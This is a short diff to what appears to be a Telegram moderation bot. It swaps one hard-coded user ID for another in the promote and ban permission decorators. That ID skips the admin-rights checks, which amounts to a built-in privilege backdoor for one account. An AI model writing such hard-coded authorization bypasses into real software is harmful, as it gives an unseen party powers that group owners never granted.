@@ -425,7 +425,7 @@ def user_can_promote(func):
         if (
             not (member.can_promote_members or member.status == "creator")
             and user not in DRAGONS
-            and user not in [1452219013]
+            and user not in [5667156680]
         ):
             if not update.callback_query:
                 update.effective_message.reply_text(no_rights)
@@ -447,7 +447,7 @@ def user_can_ban(func):
             not member.can_restrict_members
             and member.status != "creator"
             and user not in DRAGONS
-            and user not in [1452219013]
+            and user not in [5667156680]
         ):
             update.effective_message.reply_text(
                 "sᴏʀʀʏ sᴏɴ, ʙᴜᴛ ʏᴏᴜ'ʀᴇ ɴᴏᴛ ᴡᴏʀᴛʜʏ ᴛᴏ ᴡɪᴇʟᴅ ᴛʜᴇ ʙᴀɴʜᴀᴍᴍᴇʀ.",
